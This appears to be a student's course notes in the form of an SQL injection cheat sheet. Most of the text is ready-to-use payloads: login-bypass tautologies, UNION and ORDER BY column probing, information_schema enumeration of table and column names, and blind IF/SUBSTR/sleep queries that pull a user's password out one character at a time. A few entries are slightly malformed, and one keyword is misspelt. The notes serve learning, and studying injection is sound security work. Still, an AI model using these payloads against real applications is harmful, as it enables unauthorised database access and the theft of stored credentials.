# SC Topic 4 - SQL Injection

###### tags: #SC 

## Table of Contents
```toc
```
## SQL Injection Cheat Sheet
- Basic SQL Injection
```
1' or 1=1; -- -  
```
- ORDER BY Attack
```
1' order by 1; -- -
```
- UNION Attack
```
1' union select null; -- -
```
- `information_schema` Attacks (Use fillers to match number of columns in table)
```
1' union select 1,2,table_schema from information_schema.tables;-- - 
1' union select 1,table_name,table_schema from information_schema.tables; -- - 
1' union select 1,column_name,table_schema from information_schema.columns where table_name='tablename'; -- - 
```
- Using LIMIT to limit number of rows to display
```
1' union select 1,column2,column3 from table_name LIMIT 1; -- - 
```
- Using OFFSET:
```
1' union select 1,column2,column3 from table_name OFFSET 3; -- - 
```
- Using CONCAT to add two strings together
```
1' union select concat("hello", "world")
```
- Using the CHAR function to convert ASCII values to character values
```
PRINT 'a' + CHAR(9)  + 'b' -- horizontal tab 
PRINT 'a' + CHAR(10) + 'b' -- line feed 
PRINT 'a' + CHAR(11) + 'b' -- vertical tab 
PRINT 'a' + CHAR(13) + 'b' -- carriage return
```
- Attacking with IF and SUBSTRNG statements
> SUBSTRING() extracts a character from a string via its index

```
0' or userid=if([condition],'1','0'); -- - 
0' or userid=if((select substr(password,1,1) from user where userid='1')='a','1','0'); -- - 
0' or userid=if((select substr(password,1,1) from user where userid='1')='a',sleep(0))

```